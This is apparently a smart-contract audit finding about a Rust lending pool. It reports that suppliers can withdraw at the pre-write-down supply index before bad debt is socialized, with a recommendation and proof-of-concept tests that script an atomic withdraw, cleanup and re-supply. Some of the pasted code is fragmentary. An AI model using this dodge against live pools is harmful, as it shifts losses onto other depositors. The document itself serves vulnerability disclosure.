### Title
Supplier can withdraw at the pre-write-down supply index before `clean_bad_debt`/`liquidate` socializes the loss, dodging their share of bad debt - (File: contracts/pool/src/interest.rs)

### Summary
When an account becomes insolvent (debt > collateral), the bad-debt loss is not booked until a later `liquidate` or `clean_bad_debt` call runs `apply_bad_debt_to_supply_index` on the debt market. In the gap between the price move that creates the bad debt and the cleanup, `withdraw` values supplier claims at the still-unimpaired `supply_index`. A supplier who exits in that window is paid in full and pushes the entire loss onto the remaining suppliers — the same class as the Saffron report, where a user call executed between two phases of a privileged settlement sequence skips a cost the sequence was designed to impose.

### Finding Description
Bad debt exists on-chain the moment a price update makes `total_debt > total_collateral`, but the protocol only realizes it when `liquidate` finishes or `clean_bad_debt` calls `pool_seize_positions_call`, which lowers the debt market's `supply_index` via `interest::apply_bad_debt_to_supply_index` to socialize the loss across all current suppliers [1](#0-0) . The write-down formula is `new_supply_index = max(RAY/1000, floor(old_index * (supply_value - bad_debt) / supply_value))` [2](#0-1) .

`withdraw` runs no check for pending-but-unbooked bad debt. Its only guards are `require_reserves`/`require_liquidation_buffer` (cash), `require_utilization_below_max`, and `require_supply_for_debt` — and `backing_shortfall`, which counts the unrecoverable debt at face value, only gates `supply` (entry), not exit [3](#0-2) . So the position pays `floor(scaled_amount * supply_index)` at the pre-crash-of-book value.

The atomic version is even stronger: because `clean_bad_debt` is permissionless once collateral is at or below $5, a single caller can script `withdraw` → `clean_bad_debt` → `supply` in one transaction, exiting at the old index, triggering the write-down, and re-entering at the impaired index — permanently dodging their share while other suppliers absorb it [4](#0-3) .

### Impact Explanation
Theft/redistribution of user funds: the exiting supplier recovers more than their fair post-loss share, and the loss is concentrated on remaining suppliers. The test `supplier_can_exit_ahead_of_bad_debt_writedown` shows that with a 75%/25% supplier split, Bob's exit amplifies Carol's loss ~4x [5](#0-4) . At the extreme, early exiters drain available cash, and post-write-down suppliers are left with claims the pool cannot pay (temporary or permanent freezing of funds until `recapitalize`).

### Likelihood Explanation
Permissionless and economically rational: `clean_bad_debt` requires no privilege for dust-collateral accounts, `withdraw` is a normal user call, and the trigger condition (a liquidatable-but-not-yet-liquidated account) is publicly observable from oracle prices. The only limiter is `max_utilization` and pool cash: the exit reverts if it would push utilization past the cap [6](#0-5) . Large bad debt relative to idle cash is exactly when the incentive to exit first is highest — a classic bank-run dynamic, so rational actors will race.

### Recommendation
Realize bad debt before paying withdrawals. Options:
- In the controller's `withdraw` path, detect accounts eligible for liquidation/cleanup affecting the withdrawn market — impractical per-call, so more realistically:
- Mark a market "impaired" when a liquidation leaves residual uncollateralized debt (e.g., set a pending-bad-debt flag or immediately apply the write-down inside `liquidate`/`seize_positions` for the residual), so `supply_index` reflects the loss before any subsequent withdrawal.
- Alternatively, have `clean_bad_debt` invoked automatically at the end of `liquidate` when the account still meets `is_socializable_bad_debt`, closing the race window for dust accounts entirely.

pub(crate) fn execute_bad_debt_cleanup(
    env: &Env,
    cache: &mut Context,
    account_id: u64,
    account: &Account,
    totals: &AccountRiskTotals,
) {
    let mut entries: Vec<PoolSeizeEntry> = Vec::new(env);
    for (hub_asset, position) in iter_typed_positions(&account.supply_positions) {
        cache.apply_spoke_exit(
            account.spoke_id,
            UsageSide::Supply,
            &hub_asset,
            position.scaled_amount,
        );
        entries.push_back(PoolSeizeEntry {
            hub_asset,
            side: AccountPositionType::Deposit,
            position: (&position).into(),
        });
    }
    for (hub_asset, position) in iter_debt_positions(&account.borrow_positions) {
        cache.apply_spoke_exit(
            account.spoke_id,
            UsageSide::Borrow,
            &hub_asset,
            position.scaled_amount,
        );
        entries.push_back(PoolSeizeEntry {
            hub_asset,
            side: AccountPositionType::Borrow,
            position: (&position).into(),
        });
    }
    let pool_addr = cache.cached_pool_address();
    pool_seize_positions_call(env, &pool_addr, &entries);

    cache.persist_spoke_usage();

    CleanBadDebtEvent {
        account_id,
        total_borrow_usd_wad: totals.total_debt.raw(),
        total_collateral_usd_wad: totals.total_collateral.raw(),
    }
    .publish(env);

    remove_account_and_burn_nft(env, account_id);

fn exit_then_clean_then_re_enter_dodges_the_write_down_when_utilization_allows() {
    let Seed {
        t,
        runner,
        runner_account,
        victim,
    } = seed(true, 0.0);

    let ops: Vec<Op> = vec![
        &t.env,

        Op::CleanBadDebt(AccountOp { account_id: victim }),
        supply_op(&t, 0, "ETH", 50 * U),

        .run_script(&runner, &ops)
        .expect("atomic exit, clean, re-enter");
    assert!(new_id > 0 && new_id != runner_account);

        t.supply_balance_raw_for(new_id, "ETH") >= 50 * U - 1,
        "the runner kept its whole stake"
    );
    assert!(
        t.supply_balance_raw(BOB, "ETH") < bob_before,
        "BOB absorbed the entire write-down"
    );

#[test]
fn supplier_can_exit_ahead_of_bad_debt_writedown() {
    // Scenario A: nobody dodges. Bob 75%, Carol 25% of the ETH supply.
    let mut a = setup();
    a.supply(BOB, "ETH", 75.0);
    a.supply(CAROL, "ETH", 25.0);
    a.supply(ALICE, "USDC", 10.0);
    a.borrow(ALICE, "ETH", 0.003);

    let carol_before_a = a.supply_balance(CAROL, "ETH");
    a.set_price("USDC", usd_cents(10));
    a.liquidate(LIQUIDATOR, ALICE, "ETH", 0.001);
    let carol_loss_a = carol_before_a - a.supply_balance(CAROL, "ETH");

    // Scenario B: identical state, but Bob withdraws before the write-down.
    let mut b = setup();
    b.supply(BOB, "ETH", 75.0);
    b.supply(CAROL, "ETH", 25.0);
    b.supply(ALICE, "USDC", 10.0);
    b.borrow(ALICE, "ETH", 0.003);

    let carol_before_b = b.supply_balance(CAROL, "ETH");
    let bob_before_b = b.supply_balance(BOB, "ETH");
    let bob_wallet_before = b.token_balance(BOB, "ETH");

    // The crash is public state. Alice is insolvent from here on, but no
    // write-down has been applied yet.
    b.set_price("USDC", usd_cents(10));
    b.assert_liquidatable(ALICE);

    // Bob exits at the un-written-down index. No gate stops him: the
    // liquidation buffer only guards borrow draws, and `backing_shortfall`
    // still values Alice's uncollateralised debt at face.
    b.withdraw_all(BOB, "ETH");
    let bob_recovered = b.token_balance(BOB, "ETH") - bob_wallet_before;

    b.liquidate(LIQUIDATOR, ALICE, "ETH", 0.001);
    let carol_loss_b = carol_before_b - b.supply_balance(CAROL, "ETH");

    assert!(
        bob_recovered >= bob_before_b,
        "Bob exits whole: supplied={:.9} recovered={:.9}",
        bob_before_b,
        bob_recovered
    );
    assert!(
        carol_loss_b > carol_loss_a,
        "dodging must push loss onto Carol: A={:.9} B={:.9}",
        carol_loss_a,
        carol_loss_b
    );

    // Carol holds 25% of supply, so passing the whole loss to her is ~4x.
    let amplification = carol_loss_b / carol_loss_a;
    assert!(
        amplification > 3.0,
        "expected ~4x concentration onto the remaining supplier, got {:.3}x \
         (A={:.9} B={:.9})",
        amplification,
        carol_loss_a,
        carol_loss_b
    );
